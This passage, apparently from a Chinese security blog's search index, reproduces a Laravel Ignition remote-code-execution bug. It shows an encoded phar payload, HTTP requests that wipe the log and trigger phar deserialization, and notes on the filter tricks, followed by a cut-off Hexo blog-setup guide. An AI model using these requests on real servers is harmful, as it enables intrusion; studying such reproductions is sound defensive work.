;00&#x3D;31&#x3D;00&#x3D;39&#x3D;00&#x3D;63&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;34&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;49&#x3D;00&#x3D;41&#x3D;00&#x3D;4B&#x3D;00&#x3D;67&#x3D;00&#x3D;42&#x3D;00&#x3D;73&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;5A&#x3D;00&#x3D;6C&#x3D;00&#x3D;62&#x3D;00&#x3D;43&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;54&#x3D;00&#x3D;6A&#x3D;00&#x3D;74&#x3D;00&#x3D;7A&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;45&#x3D;00&#x3D;30&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;49&#x3D;00&#x3D;41&#x3D;00&#x3D;4B&#x3D;00&#x3D;67&#x3D;00&#x3D;42&#x3D;00&#x3D;70&#x3D;00&#x3D;62&#x3D;00&#x3D;6D&#x3D;00&#x3D;6C&#x3D;00&#x3D;30&#x3D;00&#x3D;61&#x3D;00&#x3D;57&#x3D;00&#x3D;46&#x3D;00&#x3D;73&#x3D;00&#x3D;61&#x3D;00&#x3D;58&#x3D;00&#x3D;70&#x3D;00&#x3D;6C&#x3D;00&#x3D;5A&#x3D;00&#x3D;43&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;59&#x3D;00&#x3D;6A&#x3D;00&#x3D;6F&#x3D;00&#x3D;78&#x3D;00&#x3D;4F&#x3D;00&#x3D;33&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;51&#x3D;00&#x3D;36&#x3D;00&#x3D;49&#x3D;00&#x3D;67&#x3D;00&#x3D;41&#x3D;00&#x3D;71&#x3D;00&#x3D;41&#x3D;00&#x3D;47&#x3D;00&#x3D;4A&#x3D;00&#x3D;31&#x3D;00&#x3D;5A&#x3D;00&#x3D;6D&#x3D;00&#x3D;5A&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;6B&#x3D;00&#x3D;78&#x3D;00&#x3D;70&#x3D;00&#x3D;62&#x3D;00&#x3D;57&#x3D;00&#x3D;6C&#x3D;00&#x3D;30&#x3D;00&#x3D;49&#x3D;00&#x3D;6A&#x3D;00&#x3D;74&#x3D;00&#x3D;70&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;30&#x3D;00&#x3D;78&#x3D;00&#x3D;4F&#x3D;00&#x3D;33&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;49&#x3D;00&#x3D;67&#x3D;00&#x3D;41&#x3D;00&#x3D;71&#x3D;00&#x3D;41&#x3D;00&#x3D;48&#x3D;00&#x3D;42&#x3D;00&#x3D;79&#x3D;00&#x3D;62&#x3D;00&#x3D;32&#x3D;00&#x3D;4E&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;33&#x3D;00&#x3D;4E&#x3D;00&#x3D;76&#x3D;00&#x3D;63&#x3D;00&#x3D;6E&#x3D;00&#x3D;4D&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;32&#x3D;00&#x3D;45&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;6A&#x3D;00&#x3D;70&#x3D;00&#x3D;37&#x3D;00&#x3D;61&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;77&#x3D;00&#x3D;4F&#x3D;00&#x3D;33&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;4E&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;69&#x3D;00&#x3D;59&#x3D;00&#x3D;33&#x3D;00&#x3D;56&#x3D;00&#x3D;79&#x3D;00&#x3D;63&#x3D;00&#x3D;6D&#x3D;00&#x3D;56&#x3D;00&#x3D;75&#x3D;00&#x3D;64&#x3D;00&#x3D;43&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;61&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;78&#x3D;00&#x3D;4F&#x3D;00&#x3D;33&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;51&#x3D;00&#x3D;36&#x3D;00&#x3D;49&#x3D;00&#x3D;6D&#x3D;00&#x3D;4E&#x3D;00&#x3D;68&#x3D;00&#x3D;62&#x3D;00&#x3D;47&#x3D;00&#x3D;78&#x3D;00&#x3D;66&#x3D;00&#x3D;64&#x3D;00&#x3D;58&#x3D;00&#x3D;4E&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;6C&#x3D;00&#x3D;39&#x3D;00&#x3D;6D&#x3D;00&#x3D;64&#x3D;00&#x3D;57&#x3D;00&#x3D;35&#x3D;00&#x3D;6A&#x3D;00&#x3D;49&#x3D;00&#x3D;6A&#x3D;00&#x3D;74&#x3D;00&#x3D;39&#x3D;00&#x3D;66&#x3D;00&#x3D;58&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;49&#x3D;00&#x3D;67&#x3D;00&#x3D;41&#x3D;00&#x3D;71&#x3D;00&#x3D;41&#x3D;00&#x3D;47&#x3D;00&#x3D;4A&#x3D;00&#x3D;31&#x3D;00&#x3D;5A&#x3D;00&#x3D;6D&#x3D;00&#x3D;5A&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;6C&#x3D;00&#x3D;4E&#x3D;00&#x3D;70&#x3D;00&#x3D;65&#x3D;00&#x3D;6D&#x3D;00&#x3D;55&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;32&#x3D;00&#x3D;6B&#x3D;00&#x3D;36&#x3D;00&#x3D;4C&#x3D;00&#x3D;54&#x3D;00&#x3D;45&#x3D;00&#x3D;37&#x3D;00&#x3D;63&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;35&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;49&#x3D;00&#x3D;41&#x3D;00&#x3D;4B&#x3D;00&#x3D;67&#x3D;00&#x3D;42&#x3D;00&#x3D;69&#x3D;00&#x3D;64&#x3D;00&#x3D;57&#x3D;00&#x3D;5A&#x3D;00&#x3D;6D&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;49&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;32&#x3D;00&#x3D;45&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;70&#x3D;00&#x3D;37&#x3D;00&#x3D;61&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;77&#x3D;00&#x3D;4F&#x3D;00&#x3D;32&#x3D;00&#x3D;45&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;6A&#x3D;00&#x3D;70&#x3D;00&#x3D;37&#x3D;00&#x3D;61&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;77&#x3D;00&#x3D;4F&#x3D;00&#x3D;33&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;4E&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;69&#x3D;00&#x3D;63&#x3D;00&#x3D;47&#x3D;00&#x3D;68&#x3D;00&#x3D;77&#x3D;00&#x3D;61&#x3D;00&#x3D;57&#x3D;00&#x3D;35&#x3D;00&#x3D;6D&#x3D;00&#x3D;62&#x3D;00&#x3D;79&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;63&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;31&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;4A&#x3D;00&#x3D;73&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;5A&#x3D;00&#x3D;6C&#x3D;00&#x3D;62&#x3D;00&#x3D;43&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;54&#x3D;00&#x3D;6A&#x3D;00&#x3D;74&#x3D;00&#x3D;39&#x3D;00&#x3D;66&#x3D;00&#x3D;58&#x3D;00&#x3D;4D&#x3D;00&#x3D;36&#x3D;00&#x3D;4F&#x3D;00&#x3D;44&#x3D;00&#x3D;6F&#x3D;00&#x3D;69&#x3D;00&#x3D;41&#x3D;00&#x3D;43&#x3D;00&#x3D;6F&#x3D;00&#x3D;41&#x3D;00&#x3D;62&#x3D;00&#x3D;47&#x3D;00&#x3D;56&#x3D;00&#x3D;32&#x3D;00&#x3D;5A&#x3D;00&#x3D;57&#x3D;00&#x3D;77&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;30&#x3D;00&#x3D;34&#x3D;00&#x3D;37&#x3D;00&#x3D;63&#x3D;00&#x3D;7A&#x3D;00&#x3D;6F&#x3D;00&#x3D;78&#x3D;00&#x3D;4E&#x3D;00&#x3D;44&#x3D;00&#x3D;6F&#x3D;00&#x3D;69&#x3D;00&#x3D;41&#x3D;00&#x3D;43&#x3D;00&#x3D;6F&#x3D;00&#x3D;41&#x3D;00&#x3D;61&#x3D;00&#x3D;57&#x3D;00&#x3D;35&#x3D;00&#x3D;70&#x3D;00&#x3D;64&#x3D;00&#x3D;47&#x3D;00&#x3D;6C&#x3D;00&#x3D;68&#x3D;00&#x3D;62&#x3D;00&#x3D;47&#x3D;00&#x3D;6C&#x3D;00&#x3D;36&#x3D;00&#x3D;5A&#x3D;00&#x3D;57&#x3D;00&#x3D;51&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;32&#x3D;00&#x3D;49&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;74&#x3D;00&#x3D;7A&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;45&#x3D;00&#x3D;30&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;49&#x3D;00&#x3D;41&#x3D;00&#x3D;4B&#x3D;00&#x3D;67&#x3D;00&#x3D;42&#x3D;00&#x3D;69&#x3D;00&#x3D;64&#x3D;00&#x3D;57&#x3D;00&#x3D;5A&#x3D;00&#x3D;6D&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;4A&#x3D;00&#x3D;4D&#x3D;00&#x3D;61&#x3D;00&#x3D;57&#x3D;00&#x3D;31&#x3D;00&#x3D;70&#x3D;00&#x3D;64&#x3D;00&#x3D;43&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;61&#x3D;00&#x3D;54&#x3D;00&#x3D;6F&#x3D;00&#x3D;74&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;74&#x3D;00&#x3D;7A&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;45&#x3D;00&#x3D;7A&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;49&#x3D;00&#x3D;41&#x3D;00&#x3D;4B&#x3D;00&#x3D;67&#x3D;00&#x3D;42&#x3D;00&#x3D;77&#x3D;00&#x3D;63&#x3D;00&#x3D;6D&#x3D;00&#x3D;39&#x3D;00&#x3D;6A&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;4E&#x3D;00&#x3D;7A&#x3D;00&#x3D;62&#x3D;00&#x3D;33&#x3D;00&#x3D;4A&#x3D;00&#x3D;7A&#x3D;00&#x3D;49&#x3D;00&#x3D;6A&#x3D;00&#x3D;74&#x3D;00&#x3D;68&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;49&#x3D;00&#x3D;36&#x3D;00&#x3D;65&#x3D;00&#x3D;32&#x3D;00&#x3D;6B&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;44&#x3D;00&#x3D;74&#x3D;00&#x3D;7A&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;63&#x3D;00&#x3D;36&#x3D;00&#x3D;49&#x3D;00&#x3D;6D&#x3D;00&#x3D;4E&#x3D;00&#x3D;31&#x3D;00&#x3D;63&#x3D;00&#x3D;6E&#x3D;00&#x3D;4A&#x3D;00&#x3D;6C&#x3D;00&#x3D;62&#x3D;00&#x3D;6E&#x3D;00&#x3D;51&#x3D;00&#x3D;69&#x3D;00&#x3D;4F&#x3D;00&#x3D;32&#x3D;00&#x3D;6B&#x3D;00&#x3D;36&#x3D;00&#x3D;4D&#x3D;00&#x3D;54&#x3D;00&#x3D;74&#x3D;00&#x3D;7A&#x3D;00&#x3D;4F&#x3D;00&#x3D;6A&#x3D;00&#x3D;45&#x3D;00&#x3D;30&#x3D;00&#x3D;4F&#x3D;00&#x3D;69&#x3D;00&#x3D;4A&#x3D;00&#x3D;6A&#x3D;00&#x3D;59&#x3D;00&#x3D;57&#x3D;00&#x3D;78&#x3D;00&#x3D;73&#x3D;00&#x3D;58&#x3D;00&#x3D;33&#x3D;00&#x3D;56&#x3D;00&#x3D;7A&#x3D;00&#x3D;5A&#x3D;00&#x3D;58&#x3D;00&#x3D;4A&#x3D;00&#x3D;66&#x3D;00&#x3D;5A&#x3D;00&#x3D;6E&#x3D;00&#x3D;56&#x3D;00&#x3D;75&#x3D;00&#x3D;59&#x3D;00&#x3D;79&#x3D;00&#x3D;49&#x3D;00&#x3D;37&#x3D;00&#x3D;66&#x3D;00&#x3D;58&#x3D;00&#x3D;31&#x3D;00&#x3D;39&#x3D;00&#x3D;42&#x3D;00&#x3D;51&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;47&#x3D;00&#x3D;52&#x3D;00&#x3D;31&#x3D;00&#x3D;62&#x3D;00&#x3D;57&#x3D;00&#x3D;31&#x3D;00&#x3D;35&#x3D;00&#x3D;42&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;4E&#x3D;00&#x3D;4E&#x3D;00&#x3D;51&#x3D;00&#x3D;42&#x3D;00&#x3D;47&#x3D;00&#x3D;41&#x3D;00&#x3D;45&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;44&#x3D;00&#x3D;48&#x3D;00&#x3D;35&#x3D;00&#x3D;2F&#x3D;00&#x3D;32&#x3D;00&#x3D;4C&#x3D;00&#x3D;51&#x3D;00&#x3D;42&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;43&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;48&#x3D;00&#x3D;52&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;33&#x3D;00&#x3D;51&#x3D;00&#x3D;75&#x3D;00&#x3D;64&#x3D;00&#x3D;48&#x3D;00&#x3D;68&#x3D;00&#x3D;30&#x3D;00&#x3D;42&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;4E&#x3D;00&#x3D;4E&#x3D;00&#x3D;51&#x3D;00&#x3D;42&#x3D;00&#x3D;47&#x3D;00&#x3D;41&#x3D;00&#x3D;45&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;44&#x3D;00&#x3D;48&#x3D;00&#x3D;35&#x3D;00&#x3D;2F&#x3D;00&#x3D;32&#x3D;00&#x3D;4C&#x3D;00&#x3D;51&#x3D;00&#x3D;42&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;64&#x3D;00&#x3D;47&#x3D;00&#x3D;56&#x3D;00&#x3D;7A&#x3D;00&#x3D;64&#x3D;00&#x3D;48&#x3D;00&#x3D;52&#x3D;00&#x3D;6C&#x3D;00&#x3D;63&#x3D;00&#x3D;33&#x3D;00&#x3D;52&#x3D;00&#x3D;35&#x3D;00&#x3D;64&#x3D;00&#x3D;71&#x3D;00&#x3D;45&#x3D;00&#x3D;47&#x3D;00&#x3D;48&#x3D;00&#x3D;58&#x3D;00&#x3D;52&#x3D;00&#x3D;53&#x3D;00&#x3D;6B&#x3D;00&#x3D;44&#x3D;00&#x3D;33&#x3D;00&#x3D;50&#x3D;00&#x3D;52&#x3D;00&#x3D;6D&#x3D;00&#x3D;33&#x3D;00&#x3D;58&#x3D;00&#x3D;36&#x3D;00&#x3D;2F&#x3D;00&#x3D;68&#x3D;00&#x3D;4E&#x3D;00&#x3D;4E&#x3D;00&#x3D;68&#x3D;00&#x3D;31&#x3D;00&#x3D;4D&#x3D;00&#x3D;58&#x3D;00&#x3D;51&#x3D;00&#x3D;49&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;41&#x3D;00&#x3D;42&#x3D;00&#x3D;48&#x3D;00&#x3D;51&#x3D;00&#x3D;6B&#x3D;00&#x3D;31&#x3D;00&#x3D;43&#x3D;00&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="清空干扰字符"><a href="#清空干扰字符" class="headerlink" title="清空干扰字符"></a>清空干扰字符</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;_ignition&#x2F;execute-solution HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.136.167:8000</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.136.167:8000&#x2F;_ignition&#x2F;execute-solution</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 291</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">&quot;parameters&quot;:&#123;</span><br><span class="line">&quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">&quot;viewFile&quot;: &quot;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;laravel&#x2F;storage&#x2F;logs&#x2F;laravel.log&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;_ignition&#x2F;execute-solution HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.136.167:8000</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.136.167:8000&#x2F;_ignition&#x2F;execute-solution</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 214</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">&quot;parameters&quot;:&#123;</span><br><span class="line">&quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">&quot;viewFile&quot;: &quot;phar:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;laravel&#x2F;storage&#x2F;logs&#x2F;laravel.log&#x2F;test.txt&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><p>代码那里就不分析了，比较简单，先 file_get_contents 后 file_put_contents，文件名可控。</p><p>我们从上面可以知道，重要步骤，实际上就是清空 log，写入 payload，最后利用 =00 ，双字节，base64会忽略其他字符等几个过滤器，实现写入phar文件，最后成功命令执行</p><h3 id="清空log"><a href="#清空log" class="headerlink" title="清空log"></a>清空log</h3><p>不要用什么三次 base64-decode，直接使用这个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;laravel&#x2F;storage&#x2F;logs&#x2F;laravel.log</span><br></pre></td></tr></table></figure><p>清除就很干净，报错就多弄两遍</p><h3 id="quoted-printable-encode-1"><a href="#quoted-printable-encode-1" class="headerlink" title="quoted-printable-encode"></a>quoted-printable-encode</h3><p>这一步要注意，base64后的payload不能含有 =，不然之后会一起被 convert.quoted-printable-decode 解码，导致错误，这是一个坑点</p><p>这个的作用主要是给payload中每一个字符后都放一个 \0 ，比如 a\0 ，之后 utf-16 解码就会解码成 a</p><h4 id="utf-16解码"><a href="#utf-16解码" class="headerlink" title="utf-16解码"></a>utf-16解码</h4><p>这个会将2个字节解码成一个，所以我们得payload前面不能是单数，不然会弄乱我们得payload，我们可以通过给payload前面补一个字符得方式去解决</p><p>这个的作用是将不属于 payload 的其他字符转换成非 ascii 字符，之后 base64 解码会自动删除这些 不属于 base64 解码范围内的字符，就可以得到完整的payload</p><h4 id="有两个-payload"><a href="#有两个-payload" class="headerlink" title="有两个 payload"></a>有两个 payload</h4><p>payload会写两次到log中，如果最后存在两次payload，那么也是不能执行得，所以我们需要避免，也可以通过在payload前面或者是payload后面加一个字符得方式来解决</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>exploit-db 提供了，我就不班门弄斧了，实际上 payload 暂时并不通用，随机应变把<br>我改了一下，是在生成 payload 后，在其前面加字符，一般加一个就能看出来行不行了。</p><h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p><img src="https://gitee.com/N0puple/nopic/raw/master/img/20210121235202109.png"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> laravel </tag>
            
            <tag> php </tag>
            
            <tag> cve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>建立博客小记</title>
      <link href="2020/06/01/%E5%BB%BA%E7%AB%8B%E5%8D%9A%E5%AE%A2%E5%B0%8F%E8%AE%B0/"/>
      <url>2020/06/01/%E5%BB%BA%E7%AB%8B%E5%8D%9A%E5%AE%A2%E5%B0%8F%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h2><p>安装 <code>node.js</code> ，<code>npm</code> ，检查是否成功安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">node -v</span><br><span class="line">=&gt; v10.15.3</span><br><span class="line">npm -v</span><br><span class="line">=&gt; 6.4.1</span><br></pre></td></tr></table></figure><p>安装 <code>hexo</code> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli </span><br></pre></td></tr></table></figure><p>创建 <code>myBlog</code> 文件夹，在文件夹中执行如下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init blog</span><br></pre></td></tr></table></figure><p>进入 <code>blog</code> 文件夹，输入命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure><p>这样相当于启动了一个服务器，可以在浏览器中访问 <code>http://localhost:4000</code> ，就可以看到初始的博客界面了。</p><h2 id="连接hexo与github"><a href="#连接hexo与github" class="headerlink" title="连接hexo与github"></a>连接hexo与github</h2><p>在 <code>github</code> 中创建仓库 <code>用户名.github.io</code></p><p>使用 <code>git</code> 配置一些信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;你的GitHub用户名&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;你的GitHub注册邮箱&quot;</span></span><br></pre></td></tr></table></figure><p>生成ssh密钥文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;你的GitHub注册邮箱&quot;</span></span><br></pre></td></tr></table></figure><p>在你的用户文件夹下找到 <code>.ssh</code> 文件夹，并获取其中 <code>id_rsa.pub</code> 的值，将其添加到 <code>github</code> 的 <code>SSH Key</code> </p><p>检测是否成功添加 <code>SSH Key</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh git@github.com</span><br></pre></td></tr></table></figure><p>打开 <code>blog</code> 文件夹下的 <code>_config.yml</code> 文件，修改最后一行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  repository: git@github.com/&#123;github用户名&#125;/&#123;github用户名&#125;.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p>安装 <code>git</code> 部署插件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>新建一篇新的文章</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new <span class="string">&quot;article title&quot;</span></span><br></pre></td></tr></table></figure><p>运行完会输出一个路径，这就是这篇文章的位置，此时就可以编辑该文章</p><p>写完后可以输入命令生成静态文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br></pre></td></tr></table></figure><p>本地预览</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure><p>上传到 <code>github</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure><h2 id="更换主题"><a href="#更换主题" class="headerlink" 